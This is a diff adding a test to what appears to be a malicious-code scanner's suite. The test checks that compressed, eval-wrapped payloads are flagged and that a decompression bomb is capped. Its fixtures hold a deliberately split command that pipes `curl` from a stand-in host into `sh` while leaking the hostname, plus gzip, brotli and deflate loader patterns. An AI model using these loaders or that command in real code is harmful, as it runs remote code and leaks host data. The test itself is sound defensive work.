@@ -407,6 +407,22 @@ test("install code hidden in other files, encodings and shipped programs", async
   assert.deepEqual(clean.findings.filter(f => ["install-time-capabilities", "install-time-network", "install-runs-bundled-program", "install-runs-test-file"].includes(f.rule) || / \(hidden\)$/.test(f.title)).map(f => `${f.rule} ${f.file}`), []);
 });
 
+test("compressed payloads are inflated (with a size cap) and scanned", async () => {
+  const zlib = await import("node:zlib");
+  const code = j("const {exec} = require('child_process');\nconst os = require('os');\nexec('cu", "rl -s https://x.example/p?h=' + os.hostname() + ' | sh');\n");
+  const r = await run(project({
+    "a.js": `eval(require("zlib").gunzipSync(Buffer.from("${zlib.gzipSync(Buffer.from(code)).toString("base64")}", "base64")).toString());\n`,
+    "b.js": `const s = "${zlib.brotliCompressSync(Buffer.from(code)).toString("base64")}";\nmodule.exports = s;\n`,
+    "c.py": `exec(__import__("zlib").decompress(__import__("base64").b64decode("${zlib.deflateSync(Buffer.from(code.replace(/require/g, "rq"))).toString("base64")}")))\n`,
+  }), { noIgnore: true });
+  const hidden = new Set(r.findings.filter(f => / \(hidden\)$/.test(f.title)).map(f => f.file));
+  assert.ok(hidden.has("a.js") && hidden.has("b.js"), [...hidden].join(","));
+  // A 50 MB "bomb" is stopped at the cap instead of filling memory.
+  const t0 = performance.now();
+  await run(project({ "bomb.js": `const x = "${zlib.gzipSync(Buffer.alloc(50 << 20, 65)).toString("base64")}";\n` }), { noIgnore: true });
+  assert.ok(performance.now() - t0 < 10000);
+});
+
 test("CLI prints a report and --fail-on sets the exit code", () => {
   const dir = project({ "a.js": j("eval(at", "ob(x));\n") });
   const cli = path.resolve("skills/vetcode/scripts/vet.mjs");
